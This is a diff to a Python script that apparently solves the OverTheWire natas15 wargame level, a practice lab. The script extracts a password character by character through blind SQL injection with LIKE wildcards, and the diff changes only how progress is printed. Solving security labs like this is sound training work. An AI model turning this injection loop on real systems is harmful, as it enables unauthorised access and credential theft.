@@ -1,5 +1,5 @@
+import sys
 import string
-
 import requests
 
 natas15 = "http://natas15.natas.labs.overthewire.org"
@@ -17,7 +17,8 @@ out = response.text
 
 while('exists' in out):
     for ch in valid_chars_list:
-        print password + ch
+        sys.stdout.flush()
+        sys.stdout.write(password + ch + '\r')
         out_form = base_string + password + ch + '%'
         payload=dict(username=out_form)
         response = requests.post(natas15, data=payload, auth=auth)
@@ -31,5 +32,5 @@ while('exists' in out):
     response = requests.post(natas15, data=payload, auth=auth)
     out = response.text
 print "Done and done."
-    
+
 exit(0)
